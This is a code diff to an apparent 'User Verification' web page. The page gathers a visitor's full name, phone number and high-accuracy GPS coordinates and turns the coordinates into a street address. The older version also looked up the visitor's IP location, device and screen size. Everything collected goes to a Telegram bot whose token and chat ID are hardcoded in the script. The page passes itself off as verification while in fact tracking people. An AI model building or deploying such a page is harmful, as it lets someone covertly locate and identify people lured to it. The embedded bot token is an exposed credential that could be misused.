@@ -45,39 +45,34 @@ button{
 <div class="box">
 <h2>User Verification</h2>
 
-<input id="name" placeholder="Full Name" required>
-<input id="phone" placeholder="Phone Number" required>
+<input id="name" placeholder="Full Name">
+<input id="phone" placeholder="Phone Number">
 
 <button onclick="getGPS()">📍 Capture Location</button>
-<div id="status"></div>
+<div id="status">Location not captured</div>
 
 <button onclick="submitData()">Submit</button>
 </div>
 
 <script>
-let gpsLat="", gpsLng="", accuracy="";
+const statusEl = document.getElementById("status");
+let gpsLat=null, gpsLng=null, accuracy=null;
 let fullAddress="Not Available";
-let ipInfo="Not Available";
-
-/* IP location backup */
-async function getIPInfo(){
-  try{
-    let res = await fetch("https://ipapi.co/json/");
-    let d = await res.json();
-    ipInfo = `${d.city}, ${d.region}, ${d.country_name} | IP: ${d.ip}`;
-  }catch{}
-}
-getIPInfo();
 
 /* Reverse geocoding */
 async function reverseGeocode(lat,lng){
   try{
-    let res = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
+      {
+        headers:{
+          "User-Agent":"LocationCaptureDemo/1.0"
+        }
+      }
     );
-    let data = await res.json();
+    const data = await res.json();
     fullAddress = data.display_name || "Address not found";
-  }catch{
+  }catch(e){
     fullAddress = "Address fetch failed";
   }
 }
@@ -85,84 +80,76 @@ async function reverseGeocode(lat,lng){
 /* Capture GPS */
 function getGPS(){
   if(!navigator.geolocation){
-    status.innerHTML="Geolocation not supported ❌";
+    statusEl.innerHTML = "Geolocation not supported ❌";
     return;
   }
+
+  statusEl.innerHTML = "Capturing location…";
 
   navigator.geolocation.getCurrentPosition(
     async pos=>{
       gpsLat = pos.coords.latitude;
       gpsLng = pos.coords.longitude;
-      accuracy = pos.coords.accuracy;
+      accuracy = Math.round(pos.coords.accuracy);
 
       await reverseGeocode(gpsLat, gpsLng);
 
-      status.innerHTML =
-        "📍 Location & Address Captured ✔️<br>"+
-        "Accuracy: "+accuracy+" meters";
+      statusEl.innerHTML =
+        "📍 Location captured ✔️<br>Accuracy: "+accuracy+" m";
     },
-    ()=>{
-      status.innerHTML =
-        "GPS denied ❌<br>IP location will be used";
+    err=>{
+      statusEl.innerHTML = "Location permission denied ❌";
     },
     {
       enableHighAccuracy:true,
-      timeout:10000,
+      timeout:15000,
       maximumAge:0
     }
   );
 }
 
-/* Submit to Telegram */
+/* Submit */
 function submitData(){
 
-  if(!name.value || !phone.value){
-    alert("Fill all details");
+  const name = document.getElementById("name").value.trim();
+  const phone = document.getElementById("phone").value.trim();
+
+  if(!name || !phone){
+    alert("Name & Phone required");
     return;
   }
 
-  // 🔴 PASTE YOUR TOKEN HERE
-  let BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
+  if(gpsLat === null){
+    alert("Please capture location first");
+    return;
+  }
 
-  // ✅ YOUR CHAT ID
-  let CHAT_ID = "543961277";
+  // 🔴 PASTE YOUR TOKEN
+  const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
+  const CHAT_ID = "543961277";
 
-  let time = new Date().toLocaleString("en-IN");
-  let device = navigator.userAgent;
-  let screenInfo = screen.width+"x"+screen.height;
+  const mapLink = `https://www.google.com/maps?q=${gpsLat},${gpsLng}`;
+  const time = new Date().toLocaleString("en-IN");
 
-  let locationBlock;
+  const message =
+`📩 NEW USER SUBMISSION
 
-  if(gpsLat){
-    let mapLink = `https://www.google.com/maps?q=${gpsLat},${gpsLng}`;
-    locationBlock =
-`📍 GPS Location
+👤 Name: ${name}
+📞 Phone: ${phone}
+
+📍 Location:
 Lat: ${gpsLat}
 Lng: ${gpsLng}
 Accuracy: ${accuracy} m
 
-🏠 Address
+🏠 Address:
 ${fullAddress}
 
-🗺 Map: ${mapLink}`;
-  }else{
-    locationBlock =
-`🌐 IP Based Location
-${ipInfo}`;
-  }
+🗺 Map:
+${mapLink}
 
-  let message =
-`📩 NEW USER SUBMISSION
-
-👤 Name: ${name.value}
-📞 Phone: ${phone.value}
-
-${locationBlock}
-
-📱 Device: ${device}
-🖥 Screen: ${screenInfo}
-
-⏰ Time: ${time}`;
+⏰ Time:
+${time}`;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
@@ -172,8 +159,12 @@ ${locationBlock}
       text:message
     })
   })
-  .then(()=>alert("Data sent to Telegram ✅"))
-  .catch(()=>alert("Telegram error ❌"));
+  .then(()=>{
+    alert("Data sent ✅");
+  })
+  .catch(()=>{
+    alert("send failed ❌");
+  });
 }
 </script>
 </body>
